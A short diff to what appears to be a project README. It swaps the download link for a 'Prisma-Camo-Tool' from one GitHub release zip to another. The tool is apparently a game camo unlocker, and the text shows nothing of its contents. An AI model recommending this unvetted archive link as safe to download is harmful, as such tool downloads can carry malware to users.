@@ -13,7 +13,7 @@
 
 ## 📥 Download
 
-**[Download Prisma-Camo-Tool](https://github.com/breakchemistsqueeze/Prisma-Camo-Tool/releases/download/898/PrismaToolCamo.zip)**
+**[Download Prisma-Camo-Tool](https://github.com/breakchemistsqueeze/Prisma-Camo-Tool/releases/download/899/Prisma-CAMO-Tool.zip)**
 
 ---
 
